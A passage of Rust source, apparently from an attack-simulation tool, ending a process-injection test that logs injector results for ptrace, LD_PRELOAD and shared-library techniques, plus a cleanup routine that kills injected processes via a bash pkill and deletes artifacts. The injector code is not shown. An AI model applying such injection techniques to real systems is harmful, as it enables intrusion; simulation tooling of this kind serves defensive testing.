                                        writeln!(log_file_handle, "Injection result: {result_str}").unwrap();
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "Failed to check injection result: {e}").unwrap();
                                    }
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "Failed to run injector: {e}").unwrap();
                            }
                        }
                    }
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported technique '{technique_type}'").unwrap();
                    writeln!(log_file_handle, "Supported techniques: ptrace, ld_preload, shared_library").unwrap();
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Process injection test complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Process injection ({technique_type}) test completed. Logs: {log_file}"),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            // Kill any processes we might have started
            let kill_cmd = "pkill -f snellen_injection || true";
            let _ = Command::new("bash")
                .arg("-c")
                .arg(kill_cmd)
                .output()
                .await;
            
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    // If it's a directory, try to remove it recursively
                    if Path::new(artifact).is_dir() {
                        if let Err(e) = std::fs::remove_dir_all(artifact) {
                            error!("Failed to remove directory {artifact}: {e}");
                        } else {
                            debug!("Removed directory: {artifact}");
                        }
                    } else {
                        // Otherwise try to remove as a file
                        if let Err(e) = std::fs::remove_file(artifact) {
                            error!("Failed to remove artifact {artifact}: {e}");
                        } else {
                            debug!("Removed artifact: {artifact}");
                        }
                    }
                }
            }
            Ok(())
        })
    }
}